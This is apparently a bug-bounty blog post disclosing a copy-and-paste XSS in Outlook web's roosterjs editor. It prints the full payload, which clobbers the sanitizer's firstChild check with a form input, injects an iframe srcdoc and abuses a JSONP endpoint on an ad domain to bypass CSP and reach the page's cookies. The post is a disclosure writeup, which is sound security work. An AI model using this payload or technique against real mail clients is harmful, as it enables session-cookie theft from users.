---
title: Copy and Paste XSS in outlook
author: TheGrandPew
date: 2021-01-26 11:33:00 +0800
categories: [Blogging, Bounties]
tags: [xss, copy&paste, csp]
math: true
toc: true
image: /assets/img/Microsoft-Outlook-logo.jpg
---


## The Bug

---

```
<form><iframe srcdoc='<script src="https://ib.adnxs.com/jpt?id=7114452&callback=alert(`Domain:\x20${window.parent.location.href}\nCookies:\x20${window.parent.document.cookie}`);"></script>'></iframe><input name=firstChild></form>
```
Lets skip strait to the bug because thats why your all here. The Bug I found was a copy and paste xss in the wysiwyg email editor in outlook web.

---

## Part One: Understanding the wysiwyg editor in outlook

---

The wysiwyg that outlook uses is called rooster-js https://github.com/microsoft/roosterjs. The part I had a look at was the copy and paste support provided by it, the basic flow of of the wysiwyg cp&paste was that firstly it would get the data off the clipboard as a html string. It will then go and santize the html string with its self rolled html sanitzer (really bad idea cause html sanitizers a hard). Finaly it will go and insert that html into the node of the editor.

---

## Part Two: blowing the brains of the rooster js html sanitizer

---

Due to the html sanitzer I couldn't just insert a normal xss payload, no I needed to find a way to bypass it. The html sanitizer [code](https://github.com/microsoft/roosterjs/blob/de8afd8ef2a40fc07cea01a0f883653fbb808f5f/packages/roosterjs-editor-dom/lib/htmlSanitizer/HtmlSanitizer.ts) I needed to bypass was using the DomParser js api to parse the a html string into a dom tree and then loop through the dom-tree and check for html nodes that are not in its whitelist.


The Bypass I found consited around this snippet of [code](https://github.com/microsoft/roosterjs/blob/de8afd8ef2a40fc07cea01a0f883653fbb808f5f/packages/roosterjs-editor-dom/lib/htmlSanitizer/HtmlSanitizer.ts#L204), the html sanitizer would access the property ?.firstChild of each html node to get the next element in the dom-tree. To bypass this protection I used a teqnique called Dom clobbering to overwrite values like ?.firstChild on a html element so that i can sneek my own html that wont get sanitzed into a html string. The exact dom clobbering payload I used was a form with an input that name was firstChild [```<form><myhtml></myhtml><input name=firstChild>```] this allowed me to place any html I wanted before the input tag exellent! 
 
---

## Part Three: outlooks csp bypass

---

As soon as I had html injection I ran into a problem, because this is dom based xss I can't just put in a script tag beacuse its content is only evaluated during the page load time. Luckly I knew a bypass for that, iframes that use srdoc have full access to the window.parent object and also are evaluated anytime they are appended to the document (not just at onload). Example ```<iframe srcdoc='<script>alert(window.parent.document.cookie)</script>'></iframe>``` would be the same as ```<script>alert(document.cookie)</script>```. After that all I needed was a bypass for its csp rules, to bypass i used the great and mighty site https://csp-evaluator.withgoogle.com/ that told me that the site https://ib.adnxs.com/ hosted a badly filtered jsonp endpoint! 
 
---

## Final words

---

Hopefully you liked my blog, if not then i guess oof. See ya <button onclick="window.close()">Bye</button>

---